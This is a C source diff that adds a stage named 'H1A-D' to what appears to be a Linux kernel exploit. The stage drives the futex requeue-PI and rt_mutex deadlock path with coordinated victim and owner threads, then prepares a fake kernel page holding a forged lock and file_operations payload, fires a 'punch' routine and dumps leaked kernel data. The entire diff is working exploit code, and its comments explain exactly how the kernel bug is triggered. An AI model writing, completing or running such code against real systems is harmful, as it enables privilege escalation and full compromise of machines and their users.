@@ -501,6 +501,21 @@ static atomic_int h1a_punch_inflight;
 static atomic_int h1a_punch_last_ret = -1;
 static atomic_int h1a_punch_last_errno;
 
+static atomic_int h1a_d_waiter_ready;
+static atomic_int h1a_d_waiter_waiting;
+static atomic_int h1a_d_owner_started;
+static atomic_int h1a_d_owner_chain_done;
+static atomic_int h1a_d_owner_stop;
+static atomic_int h1a_d_route_done;
+static atomic_int h1a_d_waiter_tid;
+static atomic_int h1a_d_punch_allowed;
+static atomic_int h1a_d_requeue_ret = 0;
+static atomic_int h1a_d_requeue_errno;
+
+static uint32_t h1a_d_f_wait;
+static uint32_t h1a_d_f_pi_target;
+static uint32_t h1a_d_f_pi_chain;
+
 static uint32_t h1a_f_wait;
 static uint32_t h1a_f_pi_target;
 static uint32_t h1a_f_pi_chain;
@@ -1229,6 +1244,179 @@ int slide_h1a_punch_test(void) {
             atomic_load(&h1a_punch_success) == 1) ? 0 : 3;
   pr_info("H1A %s calls=%d success=%d\n",
           result == 0 ? "success" : "fail",
+          atomic_load(&h1a_punch_calls),
+          atomic_load(&h1a_punch_success));
+  return result;
+}
+
+static void *h1a_d_waiter_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  int tid = (int)SYSCHK(syscall(SYS_gettid));
+  atomic_store(&h1a_d_waiter_tid, tid);
+  /* slide_h1a_pselect_punch()/slide_h1a_consumer_thread() share the H1A
+   * punch state; point them at this victim. */
+  atomic_store(&h1a_waiter_tid, tid);
+
+  if (futex_op(&h1a_d_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("H1A-D waiter lock chain errno=%d\n", errno);
+    atomic_store(&h1a_d_route_done, 1);
+    return NULL;
+  }
+  atomic_store(&h1a_d_waiter_ready, 1);
+  while (!atomic_load(&h1a_d_owner_started)) {
+    usleep(1000);
+  }
+
+  struct timespec timeout;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
+  timeout.tv_sec += SLIDE_WAIT_SECONDS;
+  atomic_store(&h1a_d_waiter_waiting, 1);
+  errno = 0;
+  int futex_ret = futex_op(&h1a_d_f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
+                           &timeout, &h1a_d_f_pi_target, 0);
+  pr_info("H1A-D waiter futex_requeue_pi ret=%d errno=%d\n",
+          futex_ret, errno);
+
+  if (atomic_load(&h1a_d_punch_allowed)) {
+    slide_h1a_pselect_punch();
+  } else {
+    pr_warning("H1A-D waiter punch skipped (requeue gate not passed)\n");
+  }
+  atomic_store(&h1a_d_route_done, 1);
+  futex_op(&h1a_d_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  while (!atomic_load(&h1a_d_owner_chain_done)) {
+    usleep(1000);
+  }
+  return NULL;
+}
+
+static void *h1a_d_owner_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  if (futex_op(&h1a_d_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("H1A-D owner lock target errno=%d\n", errno);
+    atomic_store(&h1a_d_owner_chain_done, 1);
+    atomic_store(&h1a_d_owner_stop, 1);
+    return NULL;
+  }
+  while (!atomic_load(&h1a_d_waiter_ready)) {
+    usleep(1000);
+  }
+  atomic_store(&h1a_d_owner_started, 1);
+  /* Proven deadlock shaping: the uaddr2 futex stays owned by this
+   * thread, and here we block on the chain futex held by the victim.
+   * During FUTEX_CMP_REQUEUE_PI the proxy enqueues the victim's
+   * rt_waiter onto the uaddr2 rt_mutex (owner == this thread), then
+   * task_blocks_on_rt_mutex() runs the FULL_CHAINWALK because this
+   * owner is itself blocked (rtmutex.c:1002-1022); the chain reaches
+   * the chain futex owned by the victim and returns -EDEADLK. Doing
+   * this before enqueue would hit the early `owner == task` return
+   * (rtmutex.c:951) and remove_waiter() would dequeue a node that was
+   * never enqueued, so do NOT write victim_tid|FUTEX_WAITERS here. */
+  if (futex_op(&h1a_d_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("H1A-D owner lock chain errno=%d\n", errno);
+    atomic_store(&h1a_d_owner_chain_done, 1);
+    atomic_store(&h1a_d_owner_stop, 1);
+    return NULL;
+  }
+  while (!atomic_load(&h1a_d_owner_stop)) {
+    sleep(1);
+  }
+  futex_op(&h1a_d_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  futex_op(&h1a_d_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  atomic_store(&h1a_d_owner_chain_done, 1);
+  return NULL;
+}
+
+int slide_h1a_d_test(void) {
+  pid_t watchdog_pid = -1;
+  int watchdog_pipe = -1;
+  int result = 2;
+
+  pr_info("H1A-D route: deadlock-shaped requeue probe, one attempt, "
+          "fail-closed gate\n");
+  h1a_d_f_wait = 0;
+  h1a_d_f_pi_target = 0;
+  h1a_d_f_pi_chain = 0;
+  atomic_store(&h1a_d_waiter_ready, 0);
+  atomic_store(&h1a_d_waiter_waiting, 0);
+  atomic_store(&h1a_d_owner_started, 0);
+  atomic_store(&h1a_d_owner_chain_done, 0);
+  atomic_store(&h1a_d_owner_stop, 0);
+  atomic_store(&h1a_d_route_done, 0);
+  atomic_store(&h1a_d_waiter_tid, 0);
+  atomic_store(&h1a_d_punch_allowed, 0);
+  atomic_store(&h1a_d_requeue_ret, 0);
+  atomic_store(&h1a_d_requeue_errno, 0);
+  atomic_store(&h1a_waiter_tid, 0);
+  atomic_store(&h1a_punch_go, 0);
+  atomic_store(&h1a_punch_stop, 0);
+  atomic_store(&h1a_punch_calls, 0);
+  atomic_store(&h1a_punch_success, 0);
+  atomic_store(&h1a_punch_inflight, 0);
+  atomic_store(&h1a_punch_last_ret, -1);
+  atomic_store(&h1a_punch_last_errno, 0);
+
+  watchdog_pid = slide_h1a_start_watchdog(&watchdog_pipe);
+  pthread_t waiter;
+  pthread_t owner;
+  pthread_t consumer;
+  SYSCHK(pthread_create(&waiter, NULL, h1a_d_waiter_thread, NULL));
+  SYSCHK(pthread_create(&owner, NULL, h1a_d_owner_thread, NULL));
+  SYSCHK(pthread_create(&consumer, NULL, slide_h1a_consumer_thread, NULL));
+
+  while (!atomic_load(&h1a_d_waiter_waiting) ||
+         !atomic_load(&h1a_d_owner_started)) {
+    usleep(1000);
+  }
+  /* Give the owner time to actually block on the chain futex so the
+   * requeue chainwalk sees the victim -> owner -> victim cycle. */
+  usleep(100000);
+  errno = 0;
+  int requeue_ret = futex_op(&h1a_d_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                             (void *)1, &h1a_d_f_pi_target, 0);
+  int requeue_errno = errno;
+  atomic_store(&h1a_d_requeue_ret, requeue_ret);
+  atomic_store(&h1a_d_requeue_errno, requeue_errno);
+  pr_info("H1A-D requeue ret=%d errno=%d (expected ret=-1 errno=EDEADLK)\n",
+          requeue_ret, requeue_errno);
+
+  if (requeue_ret < 0 && requeue_errno == EDEADLK) {
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    if (page_base && fake_lock && fake_w0) {
+      pr_info("H1A-D page prepared base=%016zx lock=%016zx w0=%016zx "
+              "fops=%016zx\n",
+              page_base, fake_lock, fake_w0, fake_fops);
+      atomic_store(&h1a_d_punch_allowed, 1);
+      result = 0;
+    } else {
+      pr_error("H1A-D fail step=page-prepare\n");
+      result = 2;
+    }
+  } else {
+    pr_error("H1A-D requeue signature mismatch, skipping page preparation "
+             "and punch (fail-closed)\n");
+    result = 3;
+  }
+
+  while (!atomic_load(&h1a_d_route_done)) {
+    usleep(10000);
+  }
+  atomic_store(&h1a_d_owner_stop, 1);
+  pthread_join(waiter, NULL);
+  pthread_join(owner, NULL);
+  pthread_join(consumer, NULL);
+  slide_h1a_finish_watchdog(watchdog_pid, watchdog_pipe);
+
+  if (atomic_load(&h1a_d_punch_allowed)) {
+    ks_leak_diff_dump();
+    result = (atomic_load(&h1a_punch_calls) == 1 &&
+              atomic_load(&h1a_punch_success) == 1) ? 0 : 3;
+  }
+  pr_info("H1A-D %s requeue_ret=%d requeue_errno=%d calls=%d success=%d\n",
+          result == 0 ? "success" : "fail",
+          atomic_load(&h1a_d_requeue_ret),
+          atomic_load(&h1a_d_requeue_errno),
           atomic_load(&h1a_punch_calls),
           atomic_load(&h1a_punch_success));
   return result;
